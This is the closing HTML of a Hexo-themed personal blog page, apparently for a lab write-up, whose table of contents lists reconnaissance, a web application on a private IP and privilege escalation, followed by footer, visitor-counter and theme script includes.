+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-application-10-129-75-3-8080"><span class="nav-text">Web application - 10.129.75.3:8080</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
